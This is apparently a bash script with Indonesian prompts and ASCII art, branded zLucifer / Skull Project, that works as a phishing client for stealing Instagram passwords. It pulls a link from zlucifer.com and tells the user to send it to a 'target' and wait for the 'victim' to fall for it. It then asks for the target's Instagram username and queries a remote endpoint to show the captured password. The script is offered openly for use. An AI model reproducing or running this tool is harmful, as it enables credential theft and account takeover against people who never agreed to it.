#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
intro(){
echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
read nick #membaca yang ditulis
toilet -f mono12 -F gay ZIZO IN HERE
echo " sleep 0.03           _,.-------.,_ "
echo " sleep 0.03       ,;~'             '~;, "
echo " sleep 0.03     ,;                     ;, "
echo " sleep 0.03    ;                         ; "
echo " sleep 0.03   ,'                         ', "
echo " sleep 0.03  ,;                           ;, "
echo " sleep 0.03  ; ;      .           .      ; ; "
echo " sleep 0.03  | ;   ______       ______   ; | "
echo " sleep 0.03  |  '/~'     ~' . '~     '~\'  | "
echo " sleep 0.03  |  ~  ,-~~~^~, | ,~^~~~-,  ~  | "
echo " sleep 0.03   |   |        }:{        |   | "
echo " sleep 0.03   |   l       / | \       !   | "
echo " sleep 0.03   .~  (__,.--' .^. '--.,__)  ~. "
echo " sleep 0.03   |     ---;' / | \ ';---     | "
echo " sleep 0.03    \__.       \/^\/       .__/ "
echo " sleep 0.03     V| \                 / |V "
echo " sleep 0.03      | |T~\___!___!___/~T| | "
echo " sleep 0.03      | |'IIII_I_I_I_IIII'| | "
echo " sleep 0.03      |  \,III I I I III,/  | "
echo " sleep 0.03       \   '~~~~~~~~~~'    / "
echo " sleep 0.03         \   .       .   / "
echo " sleep 0.03           \.    ^    ./ " 
echo " sleep 0.03             ^~~~^~~~^  "
echo " sleep 0.2 ================================"
echo " sleep 0.0 ==       Zi20 Project       =="
echo " sleep 0.7 ================================"
echo " Zi20 Project adalah Percobaan "
echo " N5C Ini Here "
echo
echo "Selamat datang "$nick
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_url=$(curl -s http://zlucifer.com/api/hackbae.php?request=skull_api)
get_url2=$(curl -s http://zlucifer.com/api/hackbae.php?request=skull)
cek='curl -s '$get_url2 # check status
zlucifer="user-agent: zlucifer"
clear
echo Mohon tunggu..
load
clear
intro
response=`curl -H "$zlucifer" -m "240" -s -o /dev/null -w "%{http_code}" $cek`
#echo $response
if [[ $response != *200* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo
    echo "Cara penggunaan :"
    echo "1. Copy link ini : $get_url2"
    echo "2. Kirim link yang sudah di copy ke target"
    echo "3. Jika korban sudah terkena bisa langsung di cek"
    echo 
    echo "Mau melakukan cek target?"
    echo "y/n?"
    read confirm
    if [ $confirm = "y" ]; then
            echo "Silahkan masukan username Instagram target"
            echo "contoh hack.id_"
            read target # masukin user instagram
            echo
            echo "Apakah username $target sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                echo Melakukan pencarian password username : $target
                load
                echo
                echo
                echo "Jangan close aplikasi sebelum scan selesai"            
                echo "========================================"
                cek_target=`curl -s $get_url/instagram.php?cari=$target`
                echo -e $cek_target
                echo "======================================="
                echo " Gunakan tools dengan bijak"
                echo " -zLucifer"
                echo "======================================="
            else
                echo "Kesalahan"
            fi            
    else
        echo "Terimakasih sudah menggunakan Skull Project"
    fi
fi
